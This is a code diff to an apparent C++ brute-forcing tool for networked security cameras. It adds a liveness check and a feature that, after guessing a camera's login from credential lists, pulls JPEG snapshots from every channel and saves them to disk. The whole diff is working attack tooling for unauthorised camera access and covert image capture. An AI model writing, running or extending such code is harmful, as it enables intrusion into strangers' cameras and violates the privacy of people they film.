@@ -17,7 +17,6 @@
 #include "arpa/inet.h"
 #include "unistd.h"
 
-
 #define PRINT_EVERYTHING  (options.verbosity >= 3)
 #define PRINT_RESULT      (options.verbosity >= 2)
 #define PRINT_GOOD        (options.verbosity >= 1)
@@ -31,6 +30,8 @@ static struct argp_option arg_options[] = {
     { "port", 'p', "PORT_NUMBER", 0, "Camera port. You probably need 8000, so it's default value."},
     { "ips", 'i', "FILE", 0, "A file with a list of IPs." },
     { "verbose-level", 'v', "LEVEL", 0, "Define verbosity of output. 0 - silent, 1 (normal; default) - only print results, 2 (debug) - print whatever could be printed so your mom will think you're a cool."},
+    { "check", 'c', NULL, 0, "Filter dead cameras." },
+    { "shots-path", 's', "PATH", 0, "Get photos from cameras after logging in." },
     { 0 }
 };
 
@@ -38,13 +39,16 @@ struct Options {
   unsigned int    concurrency;
   unsigned int    verbosity;
   unsigned short  port;
+  bool            check_cameras;
+  std::string     pics_path;
   std::string     ips_file;
 };
 
 static Options options = {
   1,     // Concurrency
   2,     // Verbosity level
-  8000   // Port
+  8000,  // Port
+  false   // HPR_ping
 };
 
 static std::vector<std::string> logins, passwords, ips;
@@ -68,6 +72,31 @@ static error_t parse_opt(int key, char *arg, struct argp_state *state) {
     break;
   case 'v':
     sscanf(arg, "%u", &arguments->verbosity);
+    break;
+  case 'c':
+    arguments->check_cameras = true;
+    break;
+  case 's':
+    struct stat info;
+
+    if (stat(arg, &info) != 0)
+    {
+      if (mkdir(arg, 0777) == -1)
+      {
+        std::cerr << "Can not create " << arg << std::endl;
+        exit(2);
+      }
+    }
+    else if ((info.st_mode & S_IFDIR) == 0)
+    {
+      if (mkdir(arg, 0777) == -1)
+      {
+        std::cerr << "Can not create " << arg << std::endl;
+        exit(2);
+      }
+    }
+
+    arguments->pics_path.assign(arg);
     break;
   case ARGP_KEY_ARG:
     ips.push_back(std::string(arg));
@@ -157,14 +186,44 @@ bool HPR_ping(const std::string host, const unsigned short port)
   return ((response[3] == 0x10) && (response[7] == response[11]));
 }
 
+void write_pics(const std::string ip, const long user_id, const NET_DVR_DEVICEINFO device)
+{
+  for (int channel = (int) device.byStartChan; channel < (int) device.byChanNum + (int) device.byStartChan; channel++)
+  {
+    std::string filename = options.pics_path + ip + "_" + std::to_string(channel);
+
+    NET_DVR_JPEGPARA params = {0};
+    params.wPicQuality = 2;
+    params.wPicSize = 0;
+
+    if (!NET_DVR_CaptureJPEGPicture(user_id, channel, &params, filename.c_str()))
+    {
+      if (PRINT_EVERYTHING)
+        std::cerr << "Can not load a pic from " << ip << ", "
+                  << "filename is \"" << filename << "\"" << std::endl;
+    }
+    else
+    {
+      chmod(filename.c_str(), 0777);
+
+      if (PRINT_EVERYTHING)
+        std::cout << "Got a pic from " << ip << ", "
+                  << "filename is \"" << filename << "\"" << std::endl;
+    }
+  }
+}
+
 void brute_camera(const std::string ip)
 {
-  if (HPR_ping(ip, 8000) == false)
+  if (options.check_cameras)
   {
-    if (PRINT_EVERYTHING)
-      std::cout << ip << " is dead!" << std::endl;
+    if (HPR_ping(ip, 8000) == false)
+    {
+      if (PRINT_EVERYTHING)
+        std::cout << ip << " is dead!" << std::endl;
 
-    return;
+      return;
+    }
   }
 
   for (const auto &login : logins)
@@ -192,6 +251,14 @@ void brute_camera(const std::string ip)
                     << "zero_channel: " << (int) device.byStartChan << ", "
                     << "serial: \"" << device.sSerialNumber << "\", "
                     << "DVR type: " << (int) device.byDVRType << std::endl;
+
+        if (!options.pics_path.empty())
+        {
+          if (PRINT_EVERYTHING)
+            std::cout << "Loading photos from " << ip << std::endl;
+
+          write_pics(ip, user_id, device);
+        }
         
         NET_DVR_Logout(user_id);
 
